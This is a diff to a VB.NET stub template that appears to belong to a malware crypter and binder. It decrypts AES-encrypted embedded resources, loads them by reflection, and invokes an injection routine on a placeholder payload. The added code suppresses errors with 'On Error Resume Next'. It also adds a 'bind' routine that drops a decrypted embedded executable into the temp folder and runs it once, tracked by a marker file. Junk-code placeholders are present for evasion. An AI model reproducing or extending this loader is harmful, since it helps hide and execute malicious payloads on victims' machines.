@@ -36,31 +36,39 @@ Public Class Main
 
         '@INS _Voker1(_Method(_Type(_Load(AES.Decrypter(_Resource("#INSdll"))), "INS.Main"), "ST"), Interaction.Environ("#PATH") + "#EXE")
 
+        '@BIND   Dim T As New Threading.Thread(AddressOf _Bind)
+        '@BIND   T.Start()
+
         _Voker2(_Method(_Type(_Load(AES.Decrypter(_Resource("#PEdll"))), "PE.Main"), "ST"))
 
     End Sub
 
     Public Shared Function _Load(ByVal F As Object)
+        On Error Resume Next
         Return Reflection.Assembly.Load(F)
     End Function
 
             %JUNK1%
 
     Public Shared Function _Type(ByVal L As Reflection.Assembly, ByVal One As String)
+        On Error Resume Next
         Dim x = L.GetType(One)
         Return x
     End Function
 
     Public Shared Function _Method(ByVal T As System.Type, ByVal One As String)
+        On Error Resume Next
         Dim x As Reflection.MethodInfo = T.GetMethod(One, Reflection.BindingFlags.Public Or Reflection.BindingFlags.Static)
         Return x
     End Function
 
     Public Shared Function _Voker1(ByVal M As Reflection.MethodInfo, ByVal One As String)
+        On Error Resume Next
         Return M.Invoke(Nothing, New Object() {One})
     End Function
 
     Public Shared Function _Voker2(ByVal M As Reflection.MethodInfo)
+        On Error Resume Next
         M.Invoke(Nothing, New Object() {#INJECT, Nothing, AES.Decrypter((_Resource("#PAYLOAD"))), True})
     End Function
 
@@ -72,6 +80,19 @@ Public Class Main
         Dim Res As New Resources.ResourceManager("#ResName", Asm)
         Return Res.GetObject(Name)
     End Function
+
+    '@BIND  Public Shared Sub _Bind()
+    '@BIND On Error Resume Next
+    '@ONCE If IO.File.Exists(IO.Path.GetTempPath + "#ONCE") Then
+    '@ONCE  Exit Sub
+    '@ONCE Else
+    '@BIND   Dim FN As String = IO.Path.GetTempFileName + ".exe"
+    '@BIND     IO.File.WriteAllBytes(FN, AES.Decrypter(_Resource("#BINDdll")))
+    '@ONCE      IO.File.Create(IO.Path.GetTempPath + "#ONCE")
+    '@BIND       Diagnostics.Process.Start(FN)
+    '@ONCE End If
+    '@BIND End Sub
+
 
 End Class
 
